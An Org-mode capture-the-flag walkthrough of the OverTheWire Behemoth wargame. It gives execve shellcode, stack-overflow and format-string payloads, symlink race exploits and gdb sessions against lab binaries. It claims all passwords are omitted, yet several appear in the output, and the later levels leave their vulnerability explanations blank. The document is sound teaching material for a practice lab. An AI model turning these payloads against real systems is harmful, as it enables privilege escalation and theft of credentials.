#+setupfile: ../setup.org
#+TITLE: Over The Wire: Behemoth
#+OPTIONS: toc:t

* About this Document
This document is a light-weight walk-through for solving the wargame
named Behemoth which is provided by "Over The Wire". It consists of
elementary security vulnerabilities on the 32bit x86 platform. You
can find the wargame [[https://overthewire.org/wargames/behemoth/][here]].

Each level consists of one vulnerable program, that can be exploited
to escalate privileges the password for the next level.

The format of this document is to present the vulnerability followed
by one possible exploit. No attempt is made to explain generic
knowledge such as C, GDB, or how the exploits work.

All passwords are omitted.

* Code & Conventions Used Throughout
The working directories throughout the outline are generated by =cd
$(mktemp -d)=. However, everything is presented in a relative manner.

All passwords are kept in =/etc/behemoth_pass/=.

Two pieces of code will be reused across levels. One being shellcode
and the other being =getenvaddr=. 

** Shellcode
Because we only care about getting the passwords by reading a file
located in =/etc/behemoth_pass/=, we don't care about spawning a
shell. Therefore, our shellcode executes =/bin/cat= to print the
contents of =/etc/behemoth_pass/behemothX= to standard out. The =X= in
that path is replaced by the appropriate level, which makes this
shellcode easily reusable for any level that calls for shellcode.

*** =shellcode.asm=
#+NAME: shellcode.asm
#+BEGIN_SRC asm -n 1
BITS 32

xor eax, eax    ; Our null byte
push eax

mov edx, esp    ; Save the address of our null byte
push "/cat"
push "/bin"     ; Pushes "/bin/cat\0" on the stack
mov ebx, esp    ; Keep the address of "/bin/cat\0"

push eax        ; push "\0"
push "othX"     ; Change the X to the correct level number
push "ehem"
push "///b"
push "pass"
push "oth_"
push "ehem"
push "///b"
push "/etc"     ; Creates "/etc///behemoth_pass///behemothX\0"
mov ebp, esp    ; Save

push eax        ; NULL
push ebp        ; Pointer to "/etc///behemoth_pass///behemothX\0"
push ebx        ; Pointer to "/bin/cat\0"
mov ecx, esp    ; Pointer to array of strings that's terminated with NULL

mov al, 11      ; execve("/bin/cat", (char*[]) {"/bin/cat", "/etc///behemoth_pass///behemothX", NULL}, (char*[]) {NULL});
int 0x80        
#+END_SRC

*** Compiling
Edit line 12 by replacing =X= with the correct level number. Then use
NASM to assemble the shellcode.

#+BEGIN_EXAMPLE
$ nasm -o shellcode -f bin shellcode.asm
#+END_EXAMPLE

** Environment Variables
The environment variable =EGG= will be used to store shellcode. In
order to get the address of our environment variable, we'll use
=getenvaddr.c=. This code is ripped off from Jon Erikson's book
"Hacking: The Art of Exploitation".

*** =getenvaddr.c=
#+NAME: getenvaddr.c
#+BEGIN_SRC c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
int main(int argc, char** argv)
{
    const char* ptr = getenv(argv[1]);
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2;
    printf("%x\n", ptr);
    return 0;
}
#+END_SRC

*** Compiling
To compile this, do the following:

#+BEGIN_EXAMPLE
$ gcc -m32 -o getenvaddr getenvaddr.c
#+END_EXAMPLE

* Level 0

** The Vulnerability
The user given password is checked against a hardcoded string. This
string is the password that causes the program to continue it's normal
execution and spawns a shell.

Line 33 is where the string comparsion happens. You can see our input
string is stored in =$ebp-0x5d= and the correct password is stored in
=$ebp-1c=. However, it is "encrypted". The function for encrypting and
decrypting the password is =memfrob=.

#+BEGIN_EXAMPLE -n 1
080485b1 <main>:
 80485b1:       55                      push   ebp
 80485b2:       89 e5                   mov    ebp,esp
 80485b4:       53                      push   ebx
 80485b5:       83 ec 5c                sub    esp,0x5c
 80485b8:       c7 45 e4 4f 4b 5e 47    mov    DWORD PTR [ebp-0x1c],0x475e4b4f
 80485bf:       c7 45 e8 53 59 42 45    mov    DWORD PTR [ebp-0x18],0x45425953
 80485c6:       c7 45 ec 58 5e 59 00    mov    DWORD PTR [ebp-0x14],0x595e58
 80485cd:       c7 45 f8 00 87 04 08    mov    DWORD PTR [ebp-0x8],0x8048700
 80485d4:       c7 45 f4 18 87 04 08    mov    DWORD PTR [ebp-0xc],0x8048718
 80485db:       c7 45 f0 2d 87 04 08    mov    DWORD PTR [ebp-0x10],0x804872d
 80485e2:       68 41 87 04 08          push   0x8048741
 80485e7:       e8 14 fe ff ff          call   8048400 <printf@plt>
 80485ec:       83 c4 04                add    esp,0x4
 80485ef:       8d 45 a3                lea    eax,[ebp-0x5d]
 80485f2:       50                      push   eax
 80485f3:       68 4c 87 04 08          push   0x804874c
 80485f8:       e8 73 fe ff ff          call   8048470 <__isoc99_scanf@plt>
 80485fd:       83 c4 08                add    esp,0x8
 8048600:       8d 45 e4                lea    eax,[ebp-0x1c]
 8048603:       50                      push   eax
 8048604:       e8 47 fe ff ff          call   8048450 <strlen@plt>
 8048609:       83 c4 04                add    esp,0x4
 804860c:       50                      push   eax
 804860d:       8d 45 e4                lea    eax,[ebp-0x1c]
 8048610:       50                      push   eax
 8048611:       e8 75 ff ff ff          call   804858b <memfrob>
 8048616:       83 c4 08                add    esp,0x8
 8048619:       8d 45 e4                lea    eax,[ebp-0x1c]
 804861c:       50                      push   eax
 804861d:       8d 45 a3                lea    eax,[ebp-0x5d]
 8048620:       50                      push   eax
 8048621:       e8 ca fd ff ff          call   80483f0 <strcmp@plt>
 8048626:       83 c4 08                add    esp,0x8
 8048629:       85 c0                   test   eax,eax
 804862b:       75 32                   jne    804865f <main+0xae>
 804862d:       68 51 87 04 08          push   0x8048751
 8048632:       e8 e9 fd ff ff          call   8048420 <puts@plt>
 8048637:       83 c4 04                add    esp,0x4
 804863a:       e8 d1 fd ff ff          call   8048410 <geteuid@plt>
 804863f:       89 c3                   mov    ebx,eax
 8048641:       e8 ca fd ff ff          call   8048410 <geteuid@plt>
 8048646:       53                      push   ebx
 8048647:       50                      push   eax
 8048648:       e8 f3 fd ff ff          call   8048440 <setreuid@plt>
 804864d:       83 c4 08                add    esp,0x8
 8048650:       68 62 87 04 08          push   0x8048762
 8048655:       e8 d6 fd ff ff          call   8048430 <system@plt>
 804865a:       83 c4 04                add    esp,0x4
 804865d:       eb 0d                   jmp    804866c <main+0xbb>
 804865f:       68 6a 87 04 08          push   0x804876a
 8048664:       e8 b7 fd ff ff          call   8048420 <puts@plt>
 8048669:       83 c4 04                add    esp,0x4
 804866c:       b8 00 00 00 00          mov    eax,0x0
 8048671:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 8048674:       c9                      leave
 8048675:       c3                      ret
#+END_EXAMPLE

** The Exploitation
We can open up a debugger and either set a breakpoint at =strcmp= and
look at the decrypted string or we can call =memfrob= on the string
and look at it. We'll do the latter because it's a little more
educational.

There's some initializing on =$ebp-0x1c= happening at the beginning of
=main=. (You can see this above on lines 6 through 11.) Because of
this, we'll set the breakpoint at =printf= and then do our work. Let's
check the length of =$ebp-0x1c= and call =memfrob=.

#+BEGIN_EXAMPLE
$ gdb -q /behemoth/behemoth0
Reading symbols from /behemoth/behemoth0...(no debugging symbols found)...done.
(gdb) b printf
Breakpoint 1 at 0x8048400
(gdb) r
Starting program: /behemoth/behemoth0

Breakpoint 1, 0xf7e5b7d0 in printf () from /lib32/libc.so.6
(gdb) x/s $ebp-0x1c
0xffffd6ac:     "OK^GSYBEX^Y"
(gdb) call strlen($ebp-0x1c)
$1 = 11
(gdb) call memfrob($ebp-0x1c, 11)
$2 = 0
(gdb) x/s $ebp-0x1c
0xffffd6ac:     "eatmyshorts"
(gdb) quit
A debugging session is active.

        Inferior 1 [process 16747] will be killed.

Quit anyway? (y or n) y
$ /behemoth/behemoth0
Password: eatmyshorts
Access granted..
$ whoami
behemoth1
$
#+END_EXAMPLE

* Level 1

** The Vulnerability
A classic buffer overflow on the stack.

User input is being written to a buffer on the stack with =gets= that
is 0x43 (67) bytes long. Therefore, this is vulnerable to over writing
the return address of =main=.

#+BEGIN_EXAMPLE
0804844b <main>:
 804844b:       55                      push   ebp
 804844c:       89 e5                   mov    ebp,esp
 804844e:       83 ec 44                sub    esp,0x44
 8048451:       68 00 85 04 08          push   0x8048500
 8048456:       e8 a5 fe ff ff          call   8048300 <printf@plt>
 804845b:       83 c4 04                add    esp,0x4
 804845e:       8d 45 bd                lea    eax,[ebp-0x43]
 8048461:       50                      push   eax
 8048462:       e8 a9 fe ff ff          call   8048310 <gets@plt>
 8048467:       83 c4 04                add    esp,0x4
 804846a:       68 0c 85 04 08          push   0x804850c
 804846f:       e8 ac fe ff ff          call   8048320 <puts@plt>
 8048474:       83 c4 04                add    esp,0x4
 8048477:       b8 00 00 00 00          mov    eax,0x0
 804847c:       c9                      leave
 804847d:       c3                      ret
#+END_EXAMPLE

** Exploitation
We'll put our shell in =$EGG= and overwrite the return address from
=main= to point to =$EGG=.

#+BEGIN_EXAMPLE
$ export EGG=$(cat shellcode)
$ ./getenvaddr EGG /behemoth/behemoth1
ffffda2d
$ printf "%s\x2d\xda\xff\xff" $(python -c "print('A' * 71)") | /behemoth/behemoth1
Password: Authentication failure.
Sorry.
XXXXXXXXXX
$
#+END_EXAMPLE

* Level 2

** The Vulnerability
A race condition.

#+BEGIN_EXAMPLE -n 1
0804856b <main>:
 804856b:       8d 4c 24 04             lea    ecx,[esp+0x4]
 804856f:       83 e4 f0                and    esp,0xfffffff0
 8048572:       ff 71 fc                push   DWORD PTR [ecx-0x4]
 8048575:       55                      push   ebp
 8048576:       89 e5                   mov    ebp,esp
 8048578:       53                      push   ebx
 8048579:       51                      push   ecx
 804857a:       83 c4 80                add    esp,0xffffff80
 804857d:       e8 7e fe ff ff          call   8048400 <getpid@plt>
 8048582:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 8048585:       8d 45 dc                lea    eax,[ebp-0x24]
 8048588:       83 c0 06                add    eax,0x6
 804858b:       89 45 f0                mov    DWORD PTR [ebp-0x10],eax
 804858e:       83 ec 04                sub    esp,0x4
 8048591:       ff 75 f4                push   DWORD PTR [ebp-0xc]
 8048594:       68 10 87 04 08          push   0x8048710
 8048599:       8d 45 dc                lea    eax,[ebp-0x24]
 804859c:       50                      push   eax
 804859d:       e8 9e fe ff ff          call   8048440 <sprintf@plt>
 80485a2:       83 c4 10                add    esp,0x10
 80485a5:       83 ec 08                sub    esp,0x8
 80485a8:       8d 85 78 ff ff ff       lea    eax,[ebp-0x88]
 80485ae:       50                      push   eax
 80485af:       ff 75 f0                push   DWORD PTR [ebp-0x10]
 80485b2:       e8 19 01 00 00          call   80486d0 <__lstat>
 80485b7:       83 c4 10                add    esp,0x10
 80485ba:       25 00 f0 00 00          and    eax,0xf000
 80485bf:       3d 00 80 00 00          cmp    eax,0x8000
 80485c4:       74 36                   je     80485fc <main+0x91>
 80485c6:       83 ec 0c                sub    esp,0xc
 80485c9:       ff 75 f0                push   DWORD PTR [ebp-0x10]
 80485cc:       e8 1f fe ff ff          call   80483f0 <unlink@plt>
 80485d1:       83 c4 10                add    esp,0x10
 80485d4:       e8 07 fe ff ff          call   80483e0 <geteuid@plt>
 80485d9:       89 c3                   mov    ebx,eax
 80485db:       e8 00 fe ff ff          call   80483e0 <geteuid@plt>
 80485e0:       83 ec 08                sub    esp,0x8
 80485e3:       53                      push   ebx
 80485e4:       50                      push   eax
 80485e5:       e8 36 fe ff ff          call   8048420 <setreuid@plt>
 80485ea:       83 c4 10                add    esp,0x10
 80485ed:       83 ec 0c                sub    esp,0xc
 80485f0:       8d 45 dc                lea    eax,[ebp-0x24]
 80485f3:       50                      push   eax
 80485f4:       e8 17 fe ff ff          call   8048410 <system@plt>
 80485f9:       83 c4 10                add    esp,0x10
 80485fc:       83 ec 0c                sub    esp,0xc
 80485ff:       68 d0 07 00 00          push   0x7d0
 8048604:       e8 c7 fd ff ff          call   80483d0 <sleep@plt>
 8048609:       83 c4 10                add    esp,0x10
 804860c:       8d 45 dc                lea    eax,[ebp-0x24]
 804860f:       c7 00 63 61 74 20       mov    DWORD PTR [eax],0x20746163
 8048615:       c6 40 04 00             mov    BYTE PTR [eax+0x4],0x0
 8048619:       c6 45 e0 20             mov    BYTE PTR [ebp-0x20],0x20
 804861d:       e8 be fd ff ff          call   80483e0 <geteuid@plt>
 8048622:       89 c3                   mov    ebx,eax
 8048624:       e8 b7 fd ff ff          call   80483e0 <geteuid@plt>
 8048629:       83 ec 08                sub    esp,0x8
 804862c:       53                      push   ebx
 804862d:       50                      push   eax
 804862e:       e8 ed fd ff ff          call   8048420 <setreuid@plt>
 8048633:       83 c4 10                add    esp,0x10
 8048636:       83 ec 0c                sub    esp,0xc
 8048639:       8d 45 dc                lea    eax,[ebp-0x24]
 804863c:       50                      push   eax
 804863d:       e8 ce fd ff ff          call   8048410 <system@plt>
 8048642:       83 c4 10                add    esp,0x10
 8048645:       b8 00 00 00 00          mov    eax,0x0
 804864a:       8d 65 f8                lea    esp,[ebp-0x8]
 804864d:       59                      pop    ecx
 804864e:       5b                      pop    ebx
 804864f:       5d                      pop    ebp
 8048650:       8d 61 fc                lea    esp,[ecx-0x4]
 8048653:       c3                      ret
#+END_EXAMPLE

** Exploitation

*** Part 1

#+BEGIN_EXAMPLE
$ mkdir w
$ chmod 777 w
$ cd w/
$ /behemoth/behemoth2 # While this is sleeping, run part 2
nieteidiel
$
#+END_EXAMPLE

*** Part 2
#+BEGIN_EXAMPLE
$ ln -sf /etc/behemoth_pass/behemoth2 10868 # Replace with PID
#+END_EXAMPLE

* Level 3
** The Vulnerability

** Exploitation

#+BEGIN_EXAMPLE
$ printf '\xac\x97\x04\x08\xae\x97\x04\x08%%.56877x%%1$n%%.8650x%%2$n' | /behemoth/behemoth3
#+END_EXAMPLE

* Level 4

** The Vulnerability


** Exploitation

#+BEGIN_SRC
#include <stdio.h>
#include <unistd.h>

int main() {
    int pid = fork();
    char file[] = "/tmp/XXXXXXXXXXXXXXXX";

    if (pid == 0) {
        printf("Child is sleeping...\n");
        sleep(5);
        printf("Child woke up!\n");
        printf("Executing behemoth4");
        execl("/behemoth/behemoth4", "behemoth4", NULL);
    } else {
        sprintf(file + sizeof("/tmp/") - 1, "%d", pid);
        printf("Making symlink: %s -> /etc/behemoth_pass/behemoth5\n", file);
        symlink("/etc/behemoth_pass/behemoth5", file);
    }

    return 0;
}
#+END_SRC

* Level 5
** The Vulnerability

** Exploitation

#+BEGIN_EXAMPLE
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ nc -u -l -p 1337 > pass &
[2] 3099
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ /behemoth/behemoth5
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ ls
pass
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ cat pass
mayiroeche

[2]+  Stopped                 nc -u -l -p 1337 > pass
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$
behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$
#+END_EXAMPLE

* Level 6

** The Vulnerability

** Exploitation

#+NAME: shellcode6.asm
#+BEGIN_SRC asm -n 1
BITS 32

%define PUTS [0x804a020]

push ebp
mov ebp,esp

xor eax, eax
push eax
push "itty"
push "lloK"
push "xxHe"
inc esp
inc esp
push esp
call PUTS

mov esp, ebp
pop ebp
ret
#+END_SRC

#+BEGIN_EXAMPLE
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ mkdir w
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ chmod 777 w
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX$ cd w
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX/w$ nasm -o shellcode.txt ../shellcode.asm
behemoth6@behemoth:/tmp/tmp.jH0IoFX5KX/w$ /behemoth/behemoth6
Correct.
$ cat /etc/behemoth_pass/behemoth7
baquoxuafo
$
#+END_EXAMPLE

* Level 7

** The Vulnerability

** Exploitation

#+BEGIN_EXAMPLE
$ $(python3 -c 'print("A" * 528, end="")'; printf "\xe0\xd4\xff\xff") $(cat shellcode.bin)
#+END_EXAMPLE

